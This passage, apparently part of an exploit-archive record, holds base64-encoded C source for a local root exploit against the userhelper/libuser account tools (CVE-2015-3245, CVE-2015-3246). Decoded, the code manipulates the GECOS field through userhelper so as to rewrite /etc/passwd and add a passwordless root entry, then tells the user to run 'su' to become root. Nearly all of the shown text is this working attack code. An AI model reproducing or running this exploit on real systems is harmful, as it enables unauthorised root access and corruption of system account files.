MTCkgZGllKCk7DQogICAgY2hhciAqY29uc3QgbmV3bGluZSA9IHN0cmNocihteS5wYXNzd29yZCwgJ1xuJyk7DQogICAgaWYgKG5ld2xpbmUgPT0gTlVMTCkgZGllKCk7DQogICAgKm5ld2xpbmUgPSAnXDAnOw0KDQogICAgeyBzdHJ1Y3QgdXNlcmhlbHBlciAqY29uc3QgdWggPSAmdXNlcmhlbHBlcnNbMF07DQogICAgdWgtPmZzaXplbGltID0gUkxJTV9JTkZJTklUWTsNCiAgICBmb3Jrc3RvcF91c2VyaGVscGVyKHVoKTsNCiAgICBjb250aW51ZV91c2VyaGVscGVyKHVoKTsgfQ0KDQogICAgcmV0cnk6DQogICAgaWYgKGdlbmVyYXRlX3VzZXJoZWxwZXJzKElTX1VTRVJfTEFTVCkpIHsNCiAgICAgICAgc3RydWN0IHVzZXJoZWxwZXIgKmNvbnN0IHVoMSA9ICZ1c2VyaGVscGVyc1sxXTsNCiAgICAgICAgc3RyY3B5KHVoMS0+Z2Vjb3MuZnVsbF9uYW1lLCAiXG4iKTsNCiAgICAgICAgdWgxLT5mc2l6ZWxpbSA9IHBhc3N3ZF9mc2l6ZSArIDE7DQoNCiAgICAgICAgc3RydWN0IHVzZXJoZWxwZXIgKmNvbnN0IHVoMCA9ICZ1c2VyaGVscGVyc1swXTsNCiAgICAgICAgdWgwLT5mc2l6ZWxpbSA9IHBhc3N3ZF9mc2l6ZTsNCg0KICAgICAgICBmb3Jrc3RvcF91c2VyaGVscGVyKHVoMSksIGZvcmtzdG9wX3VzZXJoZWxwZXIodWgwKTsNCiAgICAgICAgY29udGludWVfdXNlcmhlbHBlcih1aDEpLCBjb250aW51ZV91c2VyaGVscGVyKHVoMCk7DQogICAgICAgIGlmIChnZW5lcmF0ZV91c2VyaGVscGVycyhJU19VU0VSX0xBU1QpKSBkaWUoKTsNCiAgICB9DQoNCiAgICBzdGF0aWMgY29uc3QgY2hhciBhW10gPSAiPzo6MDowOjovOiI7DQogICAgcHJpbnRmKCJBdHRlbXB0aW5nIHRvIGFkZCBcIiVzXCIgdG8gXCIlc1wiXG4iLCBhLCBQQVNTV0QpOw0KDQogICAgY29uc3QgaW50IG4gPSBnZW5lcmF0ZV91c2VyaGVscGVycyhhKTsNCiAgICBpZiAobiA9PSAtMSkgew0KICAgICAgICBzdGF0aWMgaW50IHJldHJpZXM7DQogICAgICAgIGlmIChyZXRyaWVzKyspIGRpZSgpOw0KICAgICAgICBtZW1zZXQodXNlcmhlbHBlcnMsIDAsIHNpemVvZih1c2VyaGVscGVycykpOw0KICAgICAgICBkZWxldGVfbGluZXNfZnJvbV9wYXNzd2RfZmlsZSgpOw0KICAgICAgICBnb3RvIHJldHJ5Ow0KICAgIH0NCiAgICBpZiAobiA8PSAwKSBkaWUoKTsNCiAgICBpZiAobiA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgIGlmIChzdXBlcnVzZXJfZWxlY3QgPT0gJ1wwJykgZGllKCk7DQoNCiAgICBpbnQgaTsNCiAgICBmb3IgKGkgPSBuOyAtLWkgPj0gMDsgKSB7DQogICAgICAgIHByaW50ZigiU3RhcnRpbmcgYW5kIHN0b3BwaW5nIHVzZXJoZWxwZXIgIyVkXG4iLCBpKTsNCiAgICAgICAgZm9ya3N0b3BfdXNlcmhlbHBlcigmdXNlcmhlbHBlcnNbaV0pOw0KICAgIH0NCiAgICBmb3IgKGkgPSBuOyAtLWkgPj0gMDsgKSB7DQogICAgICAgIHByaW50ZigiQ29udGludWluZyBzdG9wcGVkIHVzZXJoZWxwZXIgIyVkXG4iLCBpKTsNCiAgICAgICAgY29udGludWVfdXNlcmhlbHBlcigmdXNlcmhlbHBlcnNbaV0pOw0KICAgIH0NCiAgICBwcmludGYoIkV4cGxvaXQgc3VjY2Vzc2Z1bCwgcnVuIFwic3UgJWNcIiB0byBiZWNvbWUgcm9vdFxuIiwNCiAgICAgICAgKGludClzdXBlcnVzZXJfZWxlY3QpOw0KDQogICAgeyBzdHJ1Y3QgdXNlcmhlbHBlciAqY29uc3QgdWggPSAmdXNlcmhlbHBlcnNbMF07DQogICAgdWgtPmZzaXplbGltID0gUkxJTV9JTkZJTklUWTsNCiAgICB1aC0+Z2Vjb3MgPSBteS5nZWNvczsNCiAgICBmb3Jrc3RvcF91c2VyaGVscGVyKHVoKTsNCiAgICBjb250aW51ZV91c2VyaGVscGVyKHVoKTsgfQ0KDQogICAgZXhpdChFWElUX1NVQ0NFU1MpOw0KfQ0KDQpzdGF0aWMgdm9pZA0KZ2VuZXJhdGVfZnVsbG5hbWUoY2hhciAqY29uc3QgZnVsbG5hbWUsIGNvbnN0IHNzaXplX3QgZnVsbG5hbWVfbGVuLA0KICAgIGNvbnN0IGNoYXIgYykNCnsNCiAgICBpZiAoZnVsbG5hbWUgPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKGZ1bGxuYW1lX2xlbiA8IDApIGRpZSgpOw0KICAgIGlmIChmdWxsbmFtZV9sZW4gPj0gR0VDT1NfTEVOR1RIKSBkaWUoKTsNCg0KICAgIG1lbXNldChmdWxsbmFtZSwgJ0EnLCBmdWxsbmFtZV9sZW4pOw0KDQogICAgaWYgKGZ1bGxuYW1lX2xlbiA+IDAgJiYgc3RyY2hyKEdFQ09TX0JBRENIQVJTLCBjKSA9PSBOVUxMKSB7DQogICAgICAgIGlmICghaXNhc2NpaSgodW5zaWduZWQgY2hhciljKSkgZGllKCk7DQogICAgICAgIGlmICghaXNncmFwaCgodW5zaWduZWQgY2hhciljKSkgZGllKCk7DQogICAgICAgIGZ1bGxuYW1lW2Z1bGxuYW1lX2xlbi0xXSA9IGM7DQogICAgfQ0KfQ0KDQpzdGF0aWMgc2l6ZV90IHNpdGVpbmZvX2xlbjsNCnN0YXRpYyBzaXplX3QgZnVsbG5hbWVfb2ZmOw0KDQpzdGF0aWMgc2l6ZV90IGJlZm9yZV9mdWxsbmFtZV9sZW47DQpzdGF0aWMgY2hhciAqIGJlZm9yZV9mdWxsbmFtZTsNCg0Kc3RhdGljIHNpemVfdCBhZnRlcl9mdWxsbmFtZV9sZW47DQpzdGF0aWMgY2hhciAqIGFmdGVyX2Z1bGxuYW1lOw0KDQpzdGF0aWMgaW50DQpnZW5lcmF0ZV91c2VyaGVscGVyKGNvbnN0IGNoYXIgKmNvbnN0IGEsIGNvbnN0IGludCBpLCBjaGFyICpjb25zdCBjb250ZW50cykNCnsNCiAgICBpZiAoaSA8IDApIHsNCiAgICAgICAgaWYgKGkgIT0gLTEpIGRpZSgpOw0KICAgICAgICByZXR1cm4gMDsNCiAgICB9DQogICAgaWYgKGEgPT0gTlVMTCkgZGllKCk7DQogICAgaWYgKCh1bnNpZ25lZCBpbnQpaSA+PSBzdHJsZW4oYSkpIGRpZSgpOw0KICAgIGlmIChjb250ZW50cyA9PSBOVUxMKSBkaWUoKTsNCg0KICAgIGNvbnN0IGNoYXIgX2MgPSBhW2ldOw0KICAgIGNvbnN0IGJvb2wgaXNfdXNlcl93aWxkY2FyZCA9IChfYyA9PSAnPycpOw0KICAgIGNvbnN0IGNoYXIgYyA9IChpc191c2VyX3dpbGRjYXJkID8gY2FuZGlkYXRlX3VzZXJzWzBdIDogX2MpOw0KICAgIGlmIChjID09ICdcMCcpIGRpZSgpOw0KDQogICAgY29uc3Qgc2l6ZV90IHRhcmdldCA9IHBhc3N3ZF9mc2l6ZS0xICsgaTsNCiAgICBjb25zdCBybGltX3QgZnNpemVsaW0gPSAoYVtpKzFdID09ICdcMCcpID8gUkxJTV9JTkZJTklUWSA6IHRhcmdldCsxOw0KICAgIGlmIChmc2l6ZWxpbSA8IHBhc3N3ZF9mc2l6ZSkgZGllKCk7DQoNCiAgICBjb25zdCBzaXplX3QgY29udGVudHNfbGVuID0gc3RybGVuKGNvbnRlbnRzKTsNCiAgICBpZiAoY29udGVudHNfbGVuIDwgcGFzc3dkX2ZzaXplKSBkaWUoKTsNCiAgICBpZiAoY29udGVudHNfbGVuIDw9IGZ1bGxuYW1lX29mZikgZGllKCk7DQoNCiAgICBjaGFyICpjb25zdCBmdWxsbmFtZSA9IGNvbnRlbnRzICsgZnVsbG5hbWVfb2ZmOw0KICAgIGlmIChtZW1jbXAoZnVsbG5hbWUgLSBiZWZvcmVfZnVsbG5hbWVfbGVuLA0KICAgICAgICAgYmVmb3JlX2Z1bGxuYW1lLCBiZWZvcmVfZnVsbG5hbWVfbGVuKSAhPSAwKSBkaWUoKTsNCg0KICAgIGNvbnN0IGNoYXIgKnJlc3QgPSBzdHJjaHIoZnVsbG5hbWUsICdcbicpOw0KICAgIGlmIChyZXN0ID09IE5VTEwpIGRpZSgpOw0KICAgIHJlc3QrKzsNCg0KICAgIGNvbnN0IHNzaXplX3QgZnVsbG5hbWVfbGVuID0gKHJlc3QgLSBmdWxsbmFtZSkgLSBhZnRlcl9mdWxsbmFtZV9sZW47DQogICAgaWYgKGZ1bGxuYW1lX2xlbiA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgIGlmIChmdWxsbmFtZV9sZW4gPCAwKSBkaWUoKTsNCg0KICAgIGlmIChyZXN0Wy0xXSAhPSAnXG4nKSBkaWUoKTsNCiAgICBnZW5lcmF0ZV9mdWxsbmFtZShmdWxsbmFtZSwgZnVsbG5hbWVfbGVuLCBjKTsNCiAgICBtZW1jcHkoZnVsbG5hbWUgKyBmdWxsbmFtZV9sZW4sIGFmdGVyX2Z1bGxuYW1lLCBhZnRlcl9mdWxsbmFtZV9sZW4pOw0KICAgIGlmIChyZXN0Wy0xXSAhPSAnXG4nKSBkaWUoKTsNCg0KICAgIGlmIChtZW1jbXAocmVzdCAtIGFmdGVyX2Z1bGxuYW1lX2xlbiwNCiAgICAgIGFmdGVyX2Z1bGxuYW1lLCBhZnRlcl9mdWxsbmFtZV9sZW4pICE9IDApIGRpZSgpOw0KDQogICAgc2l6ZV90IG9mZnNldDsNCiAgICBmb3IgKG9mZnNldCA9IGZ1bGxuYW1lX29mZjsgb2Zmc2V0IDwgY29udGVudHNfbGVuOyBvZmZzZXQrKykgew0KDQogICAgICAgIGNvbnN0IGNoYXIgeCA9IGNvbnRlbnRzW29mZnNldF07DQogICAgICAgIGlmICh4ID09ICdcMCcpIGRpZSgpOw0KICAgICAgICBpZiAoaXNfdXNlcl93aWxkY2FyZCkgew0KICAgICAgICAgICAgaWYgKHN0cmNocihjYW5kaWRhdGVfdXNlcnMsIHgpID09IE5VTEwpIGNvbnRpbnVlOw0KICAgICAgICAgICAgc3VwZXJ1c2VyX2VsZWN0ID0geDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICh4ICE9IGMpIGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgY29uc3Qgc3NpemVfdCBuZXdfZnVsbG5hbWVfbGVuID0gZnVsbG5hbWVfbGVuICsgKHRhcmdldCAtIG9mZnNldCk7DQogICAgICAgIGlmIChuZXdfZnVsbG5hbWVfbGVuIDwgMCkgY29udGludWU7IC8qIGdlY29zX3NpemUoKSA+IEdFQ09TX0xFTkdUSCAqLw0KICAgICAgICBpZiAoNCArIG5ld19mdWxsbmFtZV9sZW4gKyBzaXRlaW5mb19sZW4gKyAxID4gR0VDT1NfTEVOR1RIKSBjb250aW51ZTsNCg0KICAgICAgICBpZiAob2Zmc2V0IDwgZnVsbG5hbWVfb2ZmICsgZnVsbG5hbWVfbGVuKSB7DQogICAgICAgICAgICBpZiAob2Zmc2V0ICE9IGZ1bGxuYW1lX29mZiArIGZ1bGxuYW1lX2xlbi0xKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChuZXdfZnVsbG5hbWVfbGVuID09IDApIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgIGlmIChvZmZzZXQgPj0gY29udGVudHNfbGVuLTEpIHsNCiAgICAgICAgICAgIGlmIChvZmZzZXQgIT0gY29udGVudHNfbGVuLTEpIGRpZSgpOw0KICAgICAgICAgICAgaWYgKGZzaXplbGltICE9IFJMSU1fSU5GSU5JVFkpIGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgeyBjaGFyICpjb25zdCBuZXdfY29udGVudHMgPSB4bWFsbG9jKGNvbnRlbnRzX2xlbisxICsgR0VDT1NfTEVOR1RIKTsNCg0KICAgICAgICBtZW1jcHkobmV3X2NvbnRlbnRzLCBjb250ZW50cywgZnVsbG5hbWVfb2ZmKTsNCiAgICAgICAgZ2VuZXJhdGVfZnVsbG5hbWUobmV3X2NvbnRlbnRzICsgZnVsbG5hbWVfb2ZmLCBuZXdfZnVsbG5hbWVfbGVuLCBjKTsNCiAgICAgICAgbWVtY3B5KG5ld19jb250ZW50cyArIGZ1bGxuYW1lX29mZiArIG5ld19mdWxsbmFtZV9sZW4sDQogICAgICAgICAgICAgICAgICAgY29udGVudHMgKyBmdWxsbmFtZV9vZmYgKyBmdWxsbmFtZV9sZW4sDQogICAgICAgICAgICAgICAgICAgY29udGVudHNfbGVuKzEgLSAoZnVsbG5hbWVfb2ZmICsgZnVsbG5hbWVfbGVuKSk7DQoNCiAgICAgICAgaWYgKHN0cmxlbihuZXdfY29udGVudHMpICE9IGNvbnRlbnRzX2xlbiArDQogICAgICAgICAgICAgICAgKG5ld19mdWxsbmFtZV9sZW4gLSBmdWxsbmFtZV9sZW4pKSBkaWUoKTsNCg0KICAgICAgICBpZiAoZnNpemVsaW0gIT0gUkxJTV9JTkZJTklUWSkgew0KICAgICAgICAgICAgaWYgKGZzaXplbGltID49IHN0cmxlbihuZXdfY29udGVudHMpKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChmc2l6ZWxpbSA+PSBjb250ZW50c19sZW4pIGRpZSgpOw0KICAgICAgICAgICAgbWVtY3B5KG5ld19jb250ZW50cyArIGZzaXplbGltLA0KICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50cyArIGZzaXplbGltLA0KICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50c19sZW4rMSAtIGZzaXplbGltKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGNvbnN0IGludCBlcnIgPSBnZW5lcmF0ZV91c2VyaGVscGVyKGEsIGktMSwgbmV3X2NvbnRlbnRzKTsNCiAgICAgICAgZnJlZShuZXdfY29udGVudHMpOw0KICAgICAgICBpZiAoZXJyIDwgMCkgY29udGludWU7IH0NCg0KICAgICAgICBpZiAoaSA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgICAgICBzdHJ1Y3QgdXNlcmhlbHBlciAqY29uc3QgdWggPSAmdXNlcmhlbHBlcnNbaV07DQogICAgICAgIG1lbXNldCh1aCwgMCwgc2l6ZW9mKCp1aCkpOw0KDQogICAgICAgIHVoLT5mc2l6ZWxpbSA9IGZzaXplbGltOw0KICAgICAgICBpZiAobmV3X2Z1bGxuYW1lX2xlbiA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgICAgICBnZW5lcmF0ZV9mdWxsbmFtZSh1aC0+Z2Vjb3MuZnVsbF9uYW1lLCBuZXdfZnVsbG5hbWVfbGVuLCBjKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0Kc3RhdGljIGludA0KZ2VuZXJhdGVfdXNlcmhlbHBlcnMoY29uc3QgY2hhciAqY29uc3QgX2EpDQp7DQogICAgY2hhciBhW0dFQ09TX0xFTkdUSF07DQogICAgaWYgKF9hID09IE5VTEwpIGRpZSgpOw0KICAgIGNvbnN0IGludCBuID0geHNucHJpbnRmKGEsIHNpemVvZihhKSwgIlxuJXNcbiIsIF9hKTsNCiAgICBpZiAobiA+PSBHRUNPU19MRU5HVEgpIGRpZSgpOw0KICAgIGlmIChuIDw9IDApIGRpZSgpOw0KDQogICAgY29uc3QgaW50IGZkID0geG9wZW4oUEFTU1dELCBPX1JET05MWSk7DQogICAgc3RydWN0IHN0YXQgc3Q7DQogICAgaWYgKGZzdGF0KGZkLCAmc3QpICE9IDApIGRpZSgpOw0KICAgIGlmIChzdC5zdF9zaXplID49IDEwKjEwMjQqMTAyNCkgZGllKCk7DQogICAgaWYgKHN0LnN0X3NpemUgPD0gMCkgZGllKCk7DQogICAgcGFzc3dkX2ZzaXplID0gc3Quc3Rfc2l6ZTsNCg0KICAgIGNoYXIgKmNvbnN0IGNvbnRlbnRzID0geG1hbGxvYyhwYXNzd2RfZnNpemUgKyAxKTsNCiAgICBpZiAocmVhZChmZCwgY29udGVudHMsIHBhc3N3ZF9mc2l6ZSkgIT0gKHNzaXplX3QpcGFzc3dkX2ZzaXplKSBkaWUoKTsNCiAgICB4Y2xvc2UoZmQpOw0KICAgIGNvbnRlbnRzW3Bhc3N3ZF9mc2l6ZV0gPSAnXDAnOw0KICAgIGlmIChzdHJsZW4oY29udGVudHMpICE9IHBhc3N3ZF9mc2l6ZSkgZGllKCk7DQogICAgaWYgKGNvbnRlbnRzW3Bhc3N3ZF9mc2l6ZS0xXSAhPSAnXG4nKSBkaWUoKTsNCg0KICAgIGNoYXIgZnJhZ21lbnRbNjRdOw0KICAgIHhzbnByaW50ZihmcmFnbWVudCwgc2l6ZW9mKGZyYWdtZW50KSwgIlxuJXM6IiwgbXkudXNlcm5hbWUpOw0KICAgIGNvbnN0IGNoYXIgKmxpbmUgPSBzdHJzdHIoY29udGVudHMsIGZyYWdtZW50KTsNCiAgICBpZiAobGluZSA9PSBOVUxMKSBkaWUoKTsNCiAgICBsaW5lKys7DQoNCiAgICBjb25zdCBjaGFyICpyZXN0ID0gc3RyY2hyKGxpbmUsICdcbicpOw0KICAgIGlmIChyZXN0ID09IE5VTEwpIGRpZSgpOw0KICAgIGlmIChyZXN0IDw9IGxpbmUpIGRpZSgpOw0KICAgIHJlc3QrKzsNCg0KICAgIGlmIChzdHJjbXAoX2EsIElTX1VTRVJfTEFTVCkgPT0gMCkgew0KICAgICAgICBjb25zdCBib29sIGlzX3VzZXJfbGFzdCA9ICgqcmVzdCA9PSAnXDAnKTsNCiAgICAgICAgZnJlZShjb250ZW50cyk7DQogICAgICAgIHJldHVybiBpc191c2VyX2xhc3Q7DQogICAgfQ0KDQogICAgdW5zaWduZWQgaW50IGk7DQogICAgY29uc3QgY2hhciAqZmllbGQgPSBsaW5lOw0KDQogICAgZm9yIChpID0gMDsgaSA8PSA1OyBpKyspIHsNCiAgICAgICAgY29uc3QgY2hhciAqY29uc3QgZmllbGRfZW5kID0gc3RyY2hyKGZpZWxkLCAnOicpOw0KICAgICAgICBpZiAoZmllbGRfZW5kID09IE5VTEwpIGRpZSgpOw0KICAgICAgICBpZiAoZmllbGRfZW5kID49IHJlc3QpIGRpZSgpOw0KICAgICAgICBjb25zdCBzaXplX3QgZmllbGRfbGVuID0gZmllbGRfZW5kIC0gZmllbGQ7DQoNCiAgICAgICAgc3dpdGNoIChpKSB7DQogICAgICAgIGNhc2UgMDoNCiAgICAgICAgICAgIGlmIChmaWVsZF9sZW4gIT0gc3RybGVuKG15LnVzZXJuYW1lKSkgZGllKCk7DQogICAgICAgICAgICBpZiAobWVtY21wKGZpZWxkLCBteS51c2VybmFtZSwgZmllbGRfbGVuKSAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIDE6DQogICAgICAgICAgICBpZiAoKmZpZWxkICE9ICd4JykgZGllKCk7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAyOg0KICAgICAgICAgICAgaWYgKHN0cnRvaW1heChmaWVsZCwgTlVMTCwgMTApICE9IGdldHVpZCgpKSBkaWUoKTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlIDM6DQogICAgICAgICAgICBpZiAoc3RydG9pbWF4KGZpZWxkLCBOVUxMLCAxMCkgIT0gZ2V0Z2lkKCkpIGRpZSgpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgNDoNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjaGFyIGFzc2VtYmxlZFtHRUNPU19MRU5HVEhdOw0KICAgICAgICAgICAgICAgIHhzbnByaW50Zihhc3NlbWJsZWQsIHNpemVvZihhc3NlbWJsZWQpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlLipzIiwgKGludClmaWVsZF9sZW4sIGZpZWxkKTsNCiAgICAgICAgICAgICAgICBpZiAoc3RybGVuKGFzc2VtYmxlZCkgIT0gZmllbGRfbGVuKSBkaWUoKTsNCg0KICAgICAgICAgICAgICAgIHN0cnVjdCBnZWNvc19kYXRhIGdlY29zOw0KICAgICAgICAgICAgICAgIG1lbXNldCgmZ2Vjb3MsIDAsIHNpemVvZihnZWNvcykpOw0KICAgICAgICAgICAgICAgIHhzbnByaW50ZihnZWNvcy5zaXRlX2luZm8sIHNpemVvZihnZWNvcy5zaXRlX2luZm8pLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJXMiLCBteS5nZWNvcy5zaXRlX2luZm8pOw0KICAgICAgICAgICAgICAgIGlmIChzdHJjbXAoYXNzZW1ibGVkLCBnZWNvc19hc3NlbWJsZSgmZ2Vjb3MpKSAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgc2l0ZWluZm9fbGVuID0gc3RybGVuKG15LmdlY29zLnNpdGVfaW5mbyk7DQogICAgICAgICAgICBmdWxsbmFtZV9vZmYgPSBmaWVsZCAtIGNvbnRlbnRzOw0KDQogICAgICAgICAgICBiZWZvcmVfZnVsbG5hbWVfbGVuID0gZmllbGQgLSBsaW5lOw0KICAgICAgICAgICAgYmVmb3JlX2Z1bGxuYW1lID0geHN0cm5kdXAobGluZSwgYmVmb3JlX2Z1bGxuYW1lX2xlbik7DQoNCiAgICAgICAgICAgIGFmdGVyX2Z1bGxuYW1lX2xlbiA9IHJlc3QgLSBmaWVsZDsNCiAgICAgICAgICAgIGFmdGVyX2Z1bGxuYW1lID0geHN0cm5kdXAoZmllbGQsIGFmdGVyX2Z1bGxuYW1lX2xlbik7DQogICAgICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDU6DQogICAgICAgICAgICBpZiAoKmZpZWxkICE9ICcvJykgZGllKCk7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICB9DQogICAgICAgIGZpZWxkID0gZmllbGRfZW5kICsgMTsNCiAgICB9DQoNCiAgICBjb25zdCBpbnQgZXJyID0gZ2VuZXJhdGVfdXNlcmhlbHBlcihhLCBuLTEsIGNvbnRlbnRzKTsNCg0KICAgIGZyZWUoYmVmb3JlX2Z1bGxuYW1lKSwgYmVmb3JlX2Z1bGxuYW1lID0gTlVMTDsNCiAgICBmcmVlKGFmdGVyX2Z1bGxuYW1lKSwgYWZ0ZXJfZnVsbG5hbWUgPSBOVUxMOw0KICAgIGZyZWUoY29udGVudHMpOw0KDQogICAgcmV0dXJuIChlcnIgPCAwKSA/IC0xIDogbjsNCn0=", 
    "filename": "platforms/linux/dos/37706.txt", 
    "id": "37706", 
    "cves": [
        "CVE-2015-3245", 
        "CVE-2015-3246"
    ]
}
